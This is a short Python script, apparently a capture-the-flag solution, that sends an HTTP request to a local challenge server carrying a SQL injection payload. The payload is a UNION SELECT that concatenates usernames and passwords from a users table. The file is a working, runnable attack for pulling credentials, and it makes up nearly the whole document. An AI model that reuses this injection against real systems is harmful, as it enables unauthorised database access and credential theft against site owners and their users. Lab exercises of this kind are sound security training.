import urllib.parse
import requests

method = "POST"
site = "http://challenge.localhost"
port = 80

url = f"{site}:{port}/"

# Set body data.
params = {"query": '%" UNION SELECT username || password FROM users --'}

response = requests.request(method, url, params = params)

print(f"\nResponse: {response.text}")
